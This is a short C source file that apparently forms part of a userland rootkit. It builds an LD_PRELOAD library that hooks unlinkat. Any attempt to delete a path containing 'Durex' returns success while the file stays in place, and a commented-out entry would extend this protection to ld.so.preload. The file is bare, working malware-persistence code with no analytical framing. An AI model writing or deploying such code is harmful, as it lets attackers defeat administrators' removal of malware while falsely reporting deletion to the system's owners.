#define _GNU_SOURCE
#include<stdio.h>
#include<errno.h>
#include<dlfcn.h>
#include<string.h>
static const char*process_to_filter[]={"Durex",/*"ld.so.preload",*/0};
static int (*original_unlinkat)(int,const char*,int)=0;
int unlinkat(int dirfd,const char*pathname,int flags){if(original_unlinkat==0){original_unlinkat=dlsym(RTLD_NEXT,"unlinkat");if(original_unlinkat==0){fprintf(stderr,"RM dlsym: %s\n",dlerror());errno=ENOMEM;return -1;}}int i=0;while(process_to_filter[i]){if(strstr(pathname,process_to_filter[i])){return 0;}i++;}return original_unlinkat(dirfd,pathname,flags);}
